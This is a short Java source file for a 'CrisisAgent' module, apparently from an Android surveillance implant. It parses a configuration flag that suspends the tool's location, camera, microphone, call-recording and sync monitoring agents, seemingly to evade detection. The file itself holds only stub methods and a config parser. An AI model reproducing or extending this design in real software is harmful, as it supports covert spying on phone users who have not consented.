package com.ht.RCSAndroidGUI.agent;

import java.io.IOException;

import android.util.Log;

import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.utils.DataBuffer;

public class CrisisAgent extends AgentBase {

	public static final int NONE = 0x0; // Per retrocompatibilita'
	public static final int POSITION = 0x1; // Inibisci il GPS/GSM/WiFi Location
											// Agent
	public static final int CAMERA = 0x2; // Inibisci il Camera Agent
	public static final int MIC = 0x4; // Inibisci la registrazione del
										// microfono
	public static final int CALL = 0x8; // Inibisci l'agente di registrazione
										// delle chiamate
	public static final int SYNC = 0x10; // Inibisci tutte le routine di
											// sincronizzazione
	public static final int ALL = 0xffffffff; // Per retrocompatibilita'
	private static final String TAG = "CrisisAgent";

	private int type;

	@Override
	public void begin() {
		// TODO Auto-generated method stub

	}

	@Override
	public void end() {
		// TODO Auto-generated method stub

	}

	@Override
	public boolean parse(byte[] confParameters) {
		if (confParameters.length == 0) {
			// backward compatibility
			Status.self().setCrisis(0xffffffff);

			Log.i(TAG, "old configuration: " + type);

			return true;
		}

		final DataBuffer databuffer = new DataBuffer(confParameters, 0,
				confParameters.length);

		try {
			type = databuffer.readInt();
		} catch (IOException e) {
			return false;
		}

		Log.i(TAG, "type: " + type);

		Status.self().setCrisis(type);

		return true;
	}

	@Override
	public void go() {
		// TODO Auto-generated method stub

	}

}
